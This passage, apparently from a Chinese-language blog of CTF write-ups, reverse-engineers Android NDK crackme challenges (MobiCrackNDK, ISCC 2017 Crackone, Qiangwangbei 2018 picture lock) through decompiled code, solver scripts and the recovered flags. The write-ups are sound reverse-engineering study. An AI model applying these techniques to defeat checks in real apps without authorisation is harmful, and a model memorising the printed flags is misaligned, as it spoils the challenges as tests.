class="number">0000401</span>C                 DCD aLjavaLangStrin_1   ; <span class="string">&quot;()Ljava/lang/String;&quot;</span></span><br><span class="line">.data:<span class="number">00004020</span>                 DCD native_hello+<span class="number">1</span></span><br><span class="line">.data:<span class="number">00004020</span> ; .data         ends</span><br></pre></td></tr></table></figure><p>可以看到testFlag就是abcdefghijklmn函数，第二个参数括弧里的是参数，括弧外的是返回值的类型，可以看到testFlag函数的参数类型是String，参数返回类型是bool型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">abcdefghijklmn</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br></pre></td></tr></table></figure><ul><li><code>a1</code>：<code>JNIEnv*</code> 指针（通过 <code>jniEnv</code> 全局变量缓存）</li><li><code>a2</code>：未使用</li><li><code>a3</code>：输入的 Java 字符串对象（<code>jstring</code>）</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">abcdefghijklmn</span><span class="params">(JNIEnv *a1, <span class="type">int</span> a2, <span class="type">void</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// r6</span></span><br><span class="line">  jmethodID v7; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_jfieldID</span> *key; <span class="comment">// r4</span></span><br><span class="line">  jobject v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// r5</span></span><br><span class="line">  jclass v12; <span class="comment">// [sp+4h] [bp-C4h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user_input; <span class="comment">// [sp+8h] [bp-C0h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">12</span>]; <span class="comment">// [sp+14h] [bp-B4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">140</span>]; <span class="comment">// [sp+20h] [bp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !jniEnv )</span><br><span class="line">    jniEnv = a1;                                <span class="comment">// 缓存JNIEnv指针</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v15[<span class="number">12</span>], <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  user_input = (*jniEnv)-&gt;<span class="built_in">GetStringUTFChars</span>(jniEnv, a3, <span class="number">0</span>);<span class="comment">// 将java字符串转为c字符串</span></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(user_input) == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">8</span>; ++i )</span><br><span class="line">      s2[i] = user_input[i] - i;                <span class="comment">// 前8个字符减去索引值</span></span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    s2[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(seed[<span class="number">0</span>], s2) )                 <span class="comment">// 与seed[0]比较</span></span><br><span class="line">    &#123;</span><br><span class="line">      v12 = (*jniEnv)-&gt;<span class="built_in">FindClass</span>(jniEnv, <span class="string">&quot;com/example/mobicrackndk/Calc&quot;</span>);<span class="comment">// 加载这个类</span></span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;class,failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = (*jniEnv)-&gt;<span class="built_in">GetStaticMethodID</span>(jniEnv, v12, <span class="string">&quot;calcKey&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;method,failed&quot;</span>);</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      _JNIEnv::<span class="built_in">CallStaticVoidMethod</span>(jniEnv, v12, v7);<span class="comment">// 调用 Java 层的 Calc.calcKey() 方法</span></span><br><span class="line">      key = (*a1)-&gt;<span class="built_in">GetStaticFieldID</span>(a1, v12, <span class="string">&quot;key&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);<span class="comment">// 获取该静态字段的jfieldID</span></span><br><span class="line">      <span class="keyword">if</span> ( !key )</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;fid,failed&quot;</span>);</span><br><span class="line">      v9 = (*a1)-&gt;<span class="built_in">GetStaticObjectField</span>(a1, v12, key);<span class="comment">// 获取目标类的静态字段值</span></span><br><span class="line">      v10 = (*jniEnv)-&gt;<span class="built_in">GetStringUTFChars</span>(jniEnv, v9, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; <span class="built_in">strlen</span>(v10) + <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        s2[i + <span class="number">4</span>] = user_input[i] - i;          <span class="comment">// s2[i+4]其实就是v15[i]</span></span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      v15[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">strcmp</span>(v10, v15) == <span class="number">0</span>; <span class="comment">//与key进行比较</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向得到，我们的输入的前八个字节减去索引要与seed[0]相等，后八个字节减去索引要与key相同</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobicrackndk;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">static</span> String key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">calcKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> <span class="built_in">StringBuffer</span>(<span class="string">&quot;c7^WVHZ,&quot;</span>);</span><br><span class="line">        key = sb.<span class="built_in">reverse</span>().<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>key=&quot;,ZHVW^7c&quot;</code></p><p>所以写个脚本即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String key = <span class="string">&quot;QflMn`fH,ZHVW^7c&quot;</span>;</span><br><span class="line">        <span class="type">char</span>[] chars = key.<span class="built_in">toCharArray</span>();</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">            result.<span class="built_in">append</span>((<span class="type">char</span>)(chars[i] + i));  <span class="comment">// 每个字符减去索引值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.<span class="built_in">println</span>(result.<span class="built_in">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是wp说这是错误的</p><p>发现是在<code>_init_my</code>中存在对seed的修改</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> _init_my()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(seed[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    t[i] = seed[<span class="number">0</span>][i] - <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  seed[<span class="number">0</span>] = t;</span><br><span class="line">  byte_4038 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都减了3，对脚本进行修改</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String key = <span class="string">&quot;QflMn`fH,ZHVW^7c&quot;</span>;</span><br><span class="line">        <span class="type">char</span>[] chars = key.<span class="built_in">toCharArray</span>();</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">8</span>)&#123;</span><br><span class="line">                chars[i]-=<span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">append</span>((<span class="type">char</span>)(chars[i] + i));  <span class="comment">// 每个字符减去索引值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.<span class="built_in">println</span>(result.<span class="built_in">toString</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NdkMobiL4cRackEr</span><br></pre></td></tr></table></figure><p>成功</p><h1 id="静态分析综合题目"><a href="#静态分析综合题目" class="headerlink" title="静态分析综合题目"></a>静态分析综合题目</h1><h2 id="2017-ISCC-Crackone"><a href="#2017-ISCC-Crackone" class="headerlink" title="2017 ISCC Crackone"></a>2017 ISCC Crackone</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">     super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">     <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">     <span class="keyword">this</span>.editFlag = (EditText) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">     <span class="keyword">this</span>.button = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line">     <span class="keyword">this</span>.button.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: org.isclab.iscc.MainActivity.1</span></span><br><span class="line">         @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">         <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View v) &#123;</span><br><span class="line">             String flag = Digest.<span class="built_in">encode</span>(MainActivity.<span class="keyword">this</span>.editFlag.<span class="built_in">getText</span>().<span class="built_in">toString</span>()).<span class="built_in">trim</span>();</span><br><span class="line">             Log.<span class="built_in">i</span>(<span class="string">&quot;ISCC&quot;</span>, flag);</span><br><span class="line">             <span class="type">int</span> result = MainActivity.<span class="keyword">this</span>.<span class="built_in">checkFlag</span>(flag.<span class="built_in">getBytes</span>(), flag.<span class="built_in">length</span>());</span><br><span class="line">             <span class="keyword">if</span> (result == <span class="number">1</span>) &#123;</span><br><span class="line">                 Toast.<span class="built_in">makeText</span>(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;Flag验证成功！&quot;</span>, <span class="number">0</span>).<span class="built_in">show</span>();</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 Toast.<span class="built_in">makeText</span>(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;Flag验证失败！&quot;</span>, <span class="number">0</span>).<span class="built_in">show</span>();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>checkFlag为核心函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">native_checkFlag</span><span class="params">(JNIEnv *a1, <span class="type">int</span> a2, <span class="type">void</span> *usrinput, <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *usrinput_arr; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *end; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> tmp; <span class="comment">// [esp+2Bh] [ebp-21h]</span></span><br><span class="line">  jbyte *src; <span class="comment">// [esp+2Ch] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  src = (jbyte *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  (*a1)-&gt;<span class="built_in">GetByteArrayRegion</span>(a1, usrinput, <span class="number">0</span>, size, src);</span><br><span class="line">  usrinput_arr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(usrinput_arr, <span class="number">0</span>, size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(usrinput_arr, src, size);</span><br><span class="line">  <span class="keyword">if</span> ( size / <span class="number">2</span> &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    end = &amp;usrinput_arr[size];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      tmp = usrinput_arr[idx] - <span class="number">5</span>;</span><br><span class="line">      usrinput_arr[idx++] = *(end - <span class="number">1</span>);</span><br><span class="line">      *--end = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( idx != size / <span class="number">2</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  usrinput_arr[size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">free</span>(usrinput_arr);</span><br><span class="line">  <span class="built_in">free</span>(src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(usrinput_arr, <span class="string">&quot;=0HWYl1SE5UQWFfN?I+PEo.UcshU&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向得到脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">My</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;=0HWYl1SE5UQWFfN?I+PEo.UcshU&quot;</span>);</span><br><span class="line">        String re_key=key.reverse().toString();</span><br><span class="line">        <span class="type">char</span>[] chars = re_key.toCharArray();</span><br><span class="line">        <span class="type">int</span> idx=re_key.length();</span><br><span class="line">        StringBuffer result=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;idx;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;idx/<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                result.append((<span class="type">char</span>)(chars[i]+<span class="number">5</span>));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result.append(chars[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tJU0NDSkFWQU5ES1lYWH0=</span><br></pre></td></tr></table></figure><p>但是在进入checkFlag之前，还对其进行了编码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">package org.isclab.iscc;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Digest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">static</span> <span class="keyword">final</span> String TAG = <span class="string">&quot;Util/Digest&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">static</span> String str = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">static</span> String <span class="title">encode</span><span class="params">(String srcStr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (srcStr != null &amp;&amp; srcStr.<span class="built_in">length</span>() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span>[] srcStrCh = srcStr.<span class="built_in">toCharArray</span>();</span><br><span class="line">            StringBuilder asciiBinStrB = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : srcStrCh) &#123;</span><br><span class="line">                String asciiBin = Integer.<span class="built_in">toBinaryString</span>(c);</span><br><span class="line">                <span class="keyword">while</span> (asciiBin.<span class="built_in">length</span>() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">                    asciiBin = <span class="string">&quot;0&quot;</span> + asciiBin;</span><br><span class="line">                &#125;</span><br><span class="line">                asciiBinStrB.<span class="built_in">append</span>(asciiBin);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (asciiBinStrB.<span class="built_in">length</span>() % <span class="number">6</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                asciiBinStrB.<span class="built_in">append</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            String asciiBinStr = String.<span class="built_in">valueOf</span>(asciiBinStrB);</span><br><span class="line">            <span class="type">char</span>[] codeCh = <span class="keyword">new</span> <span class="type">char</span>[asciiBinStr.<span class="built_in">length</span>() / <span class="number">6</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; codeCh.length; i++) &#123;</span><br><span class="line">                <span class="type">int</span> index = Integer.<span class="built_in">parseInt</span>(asciiBinStr.<span class="built_in">substring</span>(<span class="number">0</span>, <span class="number">6</span>), <span class="number">2</span>);</span><br><span class="line">                asciiBinStr = asciiBinStr.<span class="built_in">substring</span>(<span class="number">6</span>);</span><br><span class="line">                codeCh[i] = str.<span class="built_in">charAt</span>(index);</span><br><span class="line">            &#125;</span><br><span class="line">            StringBuilder code = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>(String.<span class="built_in">valueOf</span>(codeCh));</span><br><span class="line">            <span class="keyword">if</span> (srcStr.<span class="built_in">length</span>() % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                code.<span class="built_in">append</span>(<span class="string">&quot;==&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (srcStr.<span class="built_in">length</span>() % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">                code.<span class="built_in">append</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">76</span>; i2 &lt; code.<span class="built_in">length</span>(); i2 += <span class="number">76</span>) &#123;</span><br><span class="line">                code.<span class="built_in">insert</span>(i2, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            code.<span class="built_in">append</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> String.<span class="built_in">valueOf</span>(code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> srcStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单分析，可以发现是标准base64，就不用自己写脚本了，cyberchef得到</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ISCCJAVANDKYXX&#125;</span><br></pre></td></tr></table></figure><p>成功</p><h2 id="2018-强网杯-picture-lock"><a href="#2018-强网杯-picture-lock" class="headerlink" title="2018 强网杯 picture lock"></a>2018 强网杯 picture lock</h2><p>在android中，<code>onActivityResult</code>是一个<code>android.app.Activity</code>类预先定义好的回调函数，只有当内部方法调用<code>startActivityForResult(Intent intent, int requestCode)</code>来启动另一个Activity的时候才会调用这个回调函数，被启动的Activity必须在结束前调用setResult来设置返回结果和finish来关闭自己，关闭完之后原Activity就会调用<code>onActivityResult</code>方法，并将之前启动的Activity的resultCode和intent以及一开始调用新Activity传入的requestCode一起传入<code>onActivityResult</code></p><p>MediaStore内容提供器中，<code>_data</code>代表绝对路径</p><p><strong>逆向分析：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">j</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123; <span class="comment">// 获取该包的签名信息</span></span><br><span class="line">        Signature[] signatureArr = getPackageManager().getPackageInfo(<span class="string">&quot;com.a.sample.picturelock&quot;</span>, <span class="number">64</span>).signatures; <span class="comment">// 获取该包的签名信息</span></span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>); <span class="comment">// 初始化MD5计算器</span></span><br><span class="line">        <span 